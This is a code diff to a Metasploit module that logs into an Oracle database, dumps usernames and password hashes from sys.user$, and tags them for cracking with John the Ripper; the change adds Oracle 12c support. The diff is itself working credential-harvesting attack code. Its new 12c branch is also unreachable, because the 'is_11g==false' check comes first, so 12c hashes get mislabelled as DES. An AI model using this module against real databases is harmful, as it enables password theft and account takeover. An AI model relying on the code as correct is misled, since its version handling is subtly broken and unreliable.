@@ -25,9 +25,11 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(ip)
     return if not check_dependencies
 
-    # Checks for Version of Oracle, 8g-10g all behave one way, while 11g behaves differently
-    # Also, 11g uses SHA-1 while 8g-10g use DES
+    # Checks for Version of Oracle. Behavior varies with oracle version.
+	# 12c uses SHA-512 (explained in more detail in report_hashes() below)
+    # 11g uses SHA-1 while 8g-10g use DES
     is_11g=false
+	is_12c=false
     query =  'select * from v$version'
     ver = prepare_exec(query)
 
@@ -39,7 +41,10 @@ class MetasploitModule < Msf::Auxiliary
     unless ver.empty?
       if ver[0].include?('11g')
         is_11g=true
-        print_status("Server is running 11g, using newer methods...")
+        print_status("Server is running 11g")
+	  elsif ver[0].include?('12c')
+        is_12c=true
+        print_status("Server is running 12c")
       end
     end
 
@@ -67,9 +72,9 @@ class MetasploitModule < Msf::Auxiliary
             tbl << row
           end
         end
-      # Get the usernames and hashes for 11g
-      else
-        query='SELECT name, spare4 FROM sys.user$ where password is not null and name<> \'ANONYMOUS\''
+      # Get the usernames and hashes for 11g or 12c. Query and table built the same way for both of these versions
+      elsif is_11g==true || is_12c==true
+        query='SELECT name, spare4 FROM sys.user$ where password is not null and name <> \'ANONYMOUS\''
         results= prepare_exec(query)
         #print_status("Results: #{results.inspect}")
         unless results.empty?
@@ -79,23 +84,22 @@ class MetasploitModule < Msf::Auxiliary
             tbl << row
           end
         end
-
       end
     rescue => e
       print_error("An error occurred. The supplied credentials may not have proper privs")
       return
     end
     print_status("Hash table :\n #{tbl}")
-    report_hashes(tbl, is_11g, ip, this_service)
+    report_hashes(tbl, is_11g, is_12c, ip, this_service)
   end
 
-
-
-  def report_hashes(table, is_11g, ip, service)
-    # Reports the hashes slightly differently depending on the version
+  def report_hashes(table, is_11g, is_12c, ip, service)
+    # Reports the hashes slightly differently, depending on the version
     # This is so that we know which are which when we go to crack them
     if is_11g==false
       jtr_format = "des,oracle"
+	elsif is_12c==true
+      jtr_format = "oracle12c"
     else
       jtr_format = "raw-sha1,oracle11"
     end
